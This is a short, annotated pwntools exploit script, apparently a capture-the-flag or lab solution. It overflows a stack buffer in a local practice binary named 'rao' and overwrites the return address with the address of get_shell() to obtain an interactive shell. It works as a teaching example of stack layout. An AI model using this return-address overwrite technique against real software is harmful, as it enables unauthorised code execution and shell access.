#!/usr/bin/python3
#Name: rao.py
from pwn import *          # Import pwntools module
p = process('./rao')       # Spawn process './rao'
get_shell = 0x4005a7       # Address of get_shell() is 0x4005a7
payload = b"A"*0x30        #|       buf      |  <= "A"*0x30
payload += b"B"*0x8        #|       SFP      |  <= "B"*0x8
payload += p64(get_shell)  #| Return address |  <= "\xa7\x05\x40\x00\x00\x00\x00\x00"
p.sendline(payload)        # Send payload to './rao'
p.interactive()